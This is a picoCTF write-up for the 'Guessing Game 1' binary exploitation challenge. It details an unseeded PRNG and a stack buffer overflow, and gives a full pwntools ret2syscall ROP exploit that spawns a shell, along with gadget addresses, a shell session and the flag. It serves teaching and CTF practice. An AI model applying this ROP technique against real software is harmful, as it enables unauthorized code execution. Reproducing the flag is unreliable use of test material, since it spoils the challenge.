# Guessing Game 1 - CTF Writeup

**Challenge:** Guessing Game 1  
**Author:** madStacks  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF  

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Source Code Analysis](#source-code-analysis)
4. [Stack Analysis and Offset Calculation](#stack-analysis-and-offset-calculation)
5. [Exploitation Strategy](#exploitation-strategy)
6. [Technical Deep Dive](#technical-deep-dive)
7. [Exploit Development](#exploit-development)
8. [Execution and Flag](#execution-and-flag)
9. [Key Takeaways](#key-takeaways)
10. [Appendix](#appendix)

---

## Challenge Overview

The challenge provides a 64-bit Linux executable (`vuln`) and its C source code (`vuln.c`). It's a command-line number guessing game with two critical vulnerabilities that can be chained together to achieve remote code execution.

**Challenge Description:**
> I made a simple game to show off my programming skills. See if you can beat it!

**Provided Files:**
- `vuln` - 64-bit ELF binary
- `vuln.c` - Source code

---

## Initial Reconnaissance

### File Analysis

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, ... statically linked, ... not stripped
```

**Key Observations:**
- **ELF 64-bit LSB executable, x86-64:** Standard 64-bit Linux program
- **Statically linked:** All library code is embedded in the binary - ret2libc techniques won't work
- **Not stripped:** Function names and symbols are intact, making analysis easier

### Security Protections

```bash
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    No PIE
```

**Protection Analysis:**
- ‚úÖ **NX enabled:** Stack is non-executable - can't run shellcode directly
- ‚úÖ **No PIE:** Fixed addresses - no need for information leaks
- ‚ö†Ô∏è **Canary found:** Stack canary present, but specific functions may not be protected
- ‚ö†Ô∏è **Partial RELRO:** GOT is writable (not directly relevant for this exploit)

---

## Source Code Analysis

### The main() Function

```c
int main(int argc, char **argv){
    // ... setup ...
    while (1) {
        res = do_stuff();
        if (res) {
            win();
        }
    }
    return 0;
}
```

**Program Flow:**
1. Infinite loop calling `do_stuff()`
2. If `do_stuff()` returns true, `win()` is called
3. Our goal: Make `do_stuff()` return true

### The do_stuff() Function - Vulnerability #1

```c
long get_random() {
    return rand() % BUFSIZE; // BUFSIZE is 100
}

int do_stuff() {
    long ans = get_random();
    ans = increment(ans); // Adds 1
    // ... code to get user guess `g` ...
    if (g == ans) {
        printf("Congrats! You win! ...\n");
        res = 1; // This is our goal!
    }
    // ...
    return res;
}
```

**üö® Vulnerability #1: Predictable PRNG**

The program uses `rand()` without seeding it via `srand()`. This means:
- Same "random" number sequence every execution
- The correct answer is a predictable constant
- We can find this value once and reuse it

### The win() Function - Vulnerability #2

```c
#define BUFSIZE 100

void win() {
    char winner[BUFSIZE]; // 100-byte buffer on the stack
    printf("New winner!\nName? ");
    fgets(winner, 360, stdin); // Reads up to 360 bytes!
    printf("Congrats %s\n\n", winner);
}
```

**üö® Vulnerability #2: Stack-Based Buffer Overflow**

Classic buffer overflow:
- Buffer size: 100 bytes
- Input size: 360 bytes
- Overflow: 260 bytes beyond buffer boundary
- Impact: Can overwrite saved return address and hijack control flow

---

## Stack Analysis and Offset Calculation

### Stack Layout

When `main()` calls `win()`, the stack structure is:

```
High Memory Addresses
+-----------------------------+
| Return Address (in main)    | <--- Our Target to Overwrite
+-----------------------------+
| Saved RBP (from main)       | (8 bytes)
+-----------------------------+ <--- RBP for win() points here
| ... local variables ...     |
| (char winner[100])          | (112 bytes allocated)
+-----------------------------+ <--- RSP for win() points here
Low Memory Addresses
```

### Disassembly Analysis

```assembly
// win():
00400c51  MOV    RBP,RSP          ; Base of stack frame
00400c54  SUB    RSP,0x70         ; 0x70 (112) bytes allocated
...
00400c70  LEA    RAX,[RBP-0x70]   ; Buffer address = RBP-0x70
00400c74  MOV    ESI,0x168        ; 0x168 (360) = fgets size
```

### Calculating the Offset

**Distance Calculation:**
1. Buffer to saved RBP: `0x70 = 112 bytes`
2. Saved RBP size: `8 bytes`
3. **Total offset: 112 + 8 = 120 bytes**

We need **120 bytes of padding** before overwriting the return address.

---

## Exploitation Strategy

### Attack Plan

**Step 1: Bypass the Gate**
- Find the predictable "random" number
- Send it to pass the `do_stuff()` check
- Reach the `win()` function

**Step 2: Control Execution Flow**
- Exploit buffer overflow to overwrite return address
- Problem: NX enabled - can't execute stack shellcode
- Solution: Return-Oriented Programming (ROP)

**Step 3: Two-Stage ROP Chain**

Since we can't use `ret2libc` (statically linked) and can't find `/bin/sh` in the binary:

**Stage 1 - read() Syscall:**
```
read(0, bss_addr, 8)
```
- Read `/bin/sh\x00` from stdin
- Write it to writable `.bss` section

**Stage 2 - execve() Syscall:**
```
execve(bss_addr, 0, 0)
```
- Execute the string we just wrote
- Pop a shell

---

## Technical Deep Dive

### Understanding ROP Gadgets

**What is a gadget?**

A gadget is a small sequence of instructions ending in `ret`:
```assembly
pop rdi ; ret
```

**Why do we need them?**
- NX prevents executing code on the stack
- ROP reuses existing code in the binary
- Chain gadgets together to build complex operations

### Understanding Syscalls

**What is a syscall?**

A syscall is a request to the Linux kernel to perform privileged operations.

**x86-64 Linux Syscall Convention:**

| Register | Purpose |
|----------|---------|
| RAX | Syscall number / Return value |
| RDI | Argument 1 |
| RSI | Argument 2 |
| RDX | Argument 3 |

**Common Syscalls:**
- `read()` - RAX = 0
- `execve()` - RAX = 59

**How ROP Creates Syscalls:**

```
1. Use gadgets to set registers:
   - pop rdi; ret  ‚Üí Sets RDI
   - pop rsi; ret  ‚Üí Sets RSI
   - pop rdx; ret  ‚Üí Sets RDX
   - pop rax; ret  ‚Üí Sets RAX

2. Execute syscall instruction:
   - syscall; ret  ‚Üí Triggers kernel
```

---

## Exploit Development

### Step 1: Find the Lucky Number

Using GDB to find the predictable "random" value:

```bash
$ gdb ./vuln
(gdb) b *do_stuff+29  # Break after calculation
(gdb) r
(gdb) ni              # Step one instruction
(gdb) p $rax          # Print result
$1 = 84
```

**Result: The magic number is `84`**

### Step 2: Verify Offset

Confirm the 120-byte offset using a cyclic pattern:

```bash
$ gdb ./vuln
(gdb) cyclic 200
... (copy pattern) ...
(gdb) r
> 84
> (paste pattern)
... Program crashes ...
(gdb) cyclic -l <value_in_rip>
120
```

**Offset confirmed: 120 bytes**

### Step 3: Find ROP Gadgets

Using ROPgadget to locate useful instruction sequences:

```bash
$ ROPgadget --binary ./vuln --only "pop|syscall"

# Critical gadgets found:
0x004005af : pop rax ; ret
0x004006a6 : pop rdi ; ret
0x00410b93 : pop rsi ; ret
0x00410602 : pop rdx ; ret
0x0040138c : syscall
0x0044a3ea : xor rax, rax ; syscall  # Bonus: sets RAX=0 and syscalls
```

Find writable memory address:

```bash
$ python3 -c "from pwn import *; elf=ELF('./vuln'); print(hex(elf.bss()))"
0x6bc3a0
```

### Step 4: Write the Exploit

Complete exploit using pwntools:

```python
#!/usr/bin/env python3
from pwn import *

# Setup: Load binary and connect
elf = context.binary = ELF('./vuln', checksec=False)
r = remote('shape-facility.picoctf.net', 58723)

# Bypass the gate: Send magic number
r.sendlineafter(b'guess?', b'84')

# Define constants
offset = 120
rop = ROP(elf)

# Find gadgets
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
xor_rax_syscall = 0x000000000044a3ea  # xor rax, rax; syscall

# Writable memory location
bss_addr = elf.bss() + 0x200

# Build payload
payload = b'A' * offset  # Padding to return address

# --- STAGE 1: read(0, bss_addr, 8) ---
# Read "/bin/sh\x00" from stdin and write to .bss
payload += p64(pop_rdi)           # Setup arg1
payload += p64(0)                 # RDI = 0 (stdin)
payload += p64(pop_rsi)           # Setup arg2
payload += p64(bss_addr)          # RSI = destination
payload += p64(pop_rdx)           # Setup arg3
payload += p64(8)                 # RDX = 8 bytes
payload += p64(xor_rax_syscall)   # RAX=0 and syscall (read)

# --- STAGE 2: execve(bss_addr, 0, 0) ---
# Execute the string we just wrote
payload += p64(pop_rdi)           # Setup arg1
payload += p64(bss_addr)          # RDI = "/bin/sh" address
payload += p64(pop_rsi)           # Setup arg2
payload += p64(0)                 # RSI = NULL
payload += p64(pop_rdx)           # Setup arg3
payload += p64(0)                 # RDX = NULL
payload += p64(pop_rax)           # Setup syscall number
payload += p64(59)                # RAX = 59 (execve)
payload += p64(syscall)           # Trigger syscall

# Pad to avoid issues (fgets reads up to 360)
payload += b'A' * (359 - len(payload))

# Send the overflow payload
r.sendlineafter(b'Name?', payload)

# Stage 1 ROP is executing read() - send the string
r.sendline(b'/bin/sh\x00')

# Stage 2 ROP executes - we get a shell
r.interactive()
```

---

## Execution and Flag

Running the exploit:

```bash
$ python3 solve.py
[+] Opening connection to shape-facility.picoctf.net on port 58723: Done
[*] Switching to interactive mode
$ ls
flag.txt
vuln
vuln.c
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}
```

**üö© Flag:** `picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}`

---

## Key Takeaways

### Vulnerability Chaining
Combined two vulnerabilities for full exploitation:
1. Predictable PRNG ‚Üí Bypass initial check
2. Buffer overflow ‚Üí Control execution flow

### NX Bypass with ROP
When stack is non-executable:
- Can't inject shellcode
- Must reuse existing code
- Chain gadgets to build complex operations

### ret2syscall Technique
For statically linked binaries:
- No libc functions to call
- Make direct syscalls to kernel
- Manual register setup required

### Two-Stage Attack Pattern
Problem: `/bin/sh` doesn't exist in memory

Solution:
1. Use `read()` syscall to write string to writable memory
2. Use `execve()` syscall to execute that string

This pattern is fundamental in exploitation when required strings aren't available.

---

## Appendix

### Syscall Reference (x86-64 Linux)

| Register | Purpose |
|----------|---------|
| RAX | Syscall number / Return value |
| RDI | Argument 1 |
| RSI | Argument 2 |
| RDX | Argument 3 |

**Common Syscall Numbers:**
- `0` - read
- `1` - write
- `59` - execve

### Essential GDB Commands

```bash
b *<address>          # Set breakpoint
r                     # Run program
ni                    # Next instruction
si                    # Step into
p $register           # Print register value
x/s <address>         # Examine as string
x/i $pc               # Disassemble current instruction
cyclic 200            # Generate cyclic pattern
cyclic -l <value>     # Find offset in pattern
```

### Key Pwntools Functions

```python
ELF('./path')                              # Load binary
remote('host', port)                       # Connect to service
process('./binary')                        # Run locally
r.sendlineafter(b'prompt', b'data')       # Wait and send
p64(value)                                 # Pack 64-bit value
u64(data)                                  # Unpack 64-bit value
ROP(elf)                                   # Initialize ROP
rop.find_gadget(['pop rdi', 'ret'])       # Find gadgets
r.interactive()                            # Interactive shell
```

### Additional Resources

- [ROP Emporium](https://ropemporium.com/) - ROP practice challenges
- [pwntools Documentation](https://docs.pwntools.com/) - Official docs
- [Linux Syscall Reference](https://syscalls.w3challs.com/) - Syscall numbers and usage
- [Exploit Database](https://www.exploit-db.com/) - Real-world exploits

---

**Author Notes:**

This challenge excellently demonstrates modern exploitation concepts:
- Vulnerability discovery and analysis
- Protection bypass techniques (NX via ROP)
- Syscall-level programming
- Creative problem-solving (two-stage attack)

Perfect introduction to binary exploitation with clear progression from basic overflow to advanced ROP techniques.
